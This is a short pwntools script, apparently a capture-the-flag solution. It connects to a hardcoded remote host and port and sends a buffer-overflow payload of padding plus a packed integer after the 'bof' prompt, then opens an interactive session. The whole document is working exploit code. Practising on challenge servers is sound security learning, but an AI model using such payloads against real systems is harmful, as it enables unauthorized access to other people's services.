from pwn import*
r=remote("61.147.171.103",58103)
payload='aaaa'+p32(1853186401)
r.sendlineafter("bof",payload)
r.interactive()